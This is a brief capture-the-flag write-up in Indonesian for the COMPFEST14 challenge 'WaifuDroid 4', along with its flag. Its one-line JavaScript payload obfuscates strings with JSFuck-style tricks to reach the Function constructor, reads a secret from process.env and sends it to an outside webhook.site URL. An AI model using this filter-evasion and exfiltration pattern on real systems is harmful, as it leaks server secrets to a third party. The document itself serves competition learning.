# Writeup - WaifuDroid 4
Solusi chall ini adalah gabungan dari salah satu trik WTFjs dan JSFuck, yaitu dengan membuat anonymous function dengan string "constructor". Lalu, tinggal melempar flag ke webhook.

```
let _="const"+"ructor";let url="https://webhook" + (+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]] + "site/458c90a9-51a6-4a0f-b0fd-a1d982d45560/"+_[_][_]("return p"+"rocess['env']['fla'+'g']")();require("https")["get"](url)
```

## Flag
```
COMPFEST14{le_ebic_wtfscript_trickster__wo0o}
```